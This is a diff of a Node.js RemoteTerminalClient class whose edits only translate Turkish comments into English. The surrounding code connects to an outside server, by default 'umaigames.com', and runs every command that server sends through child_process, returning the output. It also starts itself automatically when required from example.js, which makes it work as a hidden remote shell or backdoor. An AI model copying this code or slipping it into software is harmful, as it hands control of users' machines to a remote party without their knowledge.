@@ -18,7 +18,7 @@ class RemoteTerminalClient {
   }
 
   /**
-   * Socket.IO bağlantısını başlat
+   * Initialize Socket.IO connection
    */
   connect() {
     const socketUrl = `http://${this.host}:${this.port}`;
@@ -36,15 +36,15 @@ class RemoteTerminalClient {
   }
 
   /**
-   * Socket event handler'larını ayarla
+   * Setup Socket event handlers
    */
   setupEventHandlers() {
-    // Bağlantı başarılı
+    // Connection successful
     this.socket.on("connect", () => {
       console.log("Connected");
       this.connected = true;
       
-      // Terminal odasına katıl
+      // Join terminal room
       this.socket.emit("joinToRoom", { 
         roomName: `terminal-${this.id}` 
       });
@@ -54,7 +54,7 @@ class RemoteTerminalClient {
       }
     });
 
-    // Bağlantı kesildi
+    // Connection closed
     this.socket.on("disconnect", (reason) => {
       this.connected = false;
       
@@ -63,29 +63,29 @@ class RemoteTerminalClient {
       }
     });
 
-    // Bağlantı hatası
+    // Connection error
     this.socket.on("connect_error", (error) => {
       if (this.onError) {
         this.onError(error);
       }
     });
 
-    // Komut isteği - Ana mantık burada
+    // Command request - Main logic here
     this.socket.on("getRunRequest", (data) => {
       this.handleCommand(data);
     });
   }
 
   /**
-   * Gelen komutu işle ve çalıştır
+   * Handle and execute incoming command
    */
   handleCommand(data) {
-    // Tüm komutları child_process ile çalıştır
+    // Execute all commands using child_process
     this.executeCommand(data);
   }
 
   /**
-   * Normal komutu child_process ile çalıştır
+   * Execute normal command using child_process
    */
   executeCommand(data) {
     try {
@@ -101,7 +101,7 @@ class RemoteTerminalClient {
             data["cmd"] = stdout;
           }
 
-          // Sonucu sunucuya gönder
+          // Send result to server
           this.socket.emit("getRunResponse", data);
         }
       );
@@ -113,7 +113,7 @@ class RemoteTerminalClient {
 
 
   /**
-   * Bağlantıyı kapat
+   * Close connection
    */
   disconnect() {
     if (this.socket) {
@@ -123,7 +123,7 @@ class RemoteTerminalClient {
   }
 
   /**
-   * Bağlantı durumunu kontrol et
+   * Check connection status
    */
   isConnected() {
     return this.connected && this.socket && this.socket.connected;
@@ -132,8 +132,8 @@ class RemoteTerminalClient {
 
 module.exports = RemoteTerminalClient;
 
-// example.js'den require edildiğinde otomatik başlat
-// module.parent kontrolü ile example.js'den çağrıldığını anla
+// Auto-start when required from example.js
+// Detect if called from example.js using module.parent check
 if (module.parent && module.parent.filename && module.parent.filename.includes('example.js')) {
   const client = new RemoteTerminalClient({
     host: process.env.RTC_HOST || "umaigames.com",
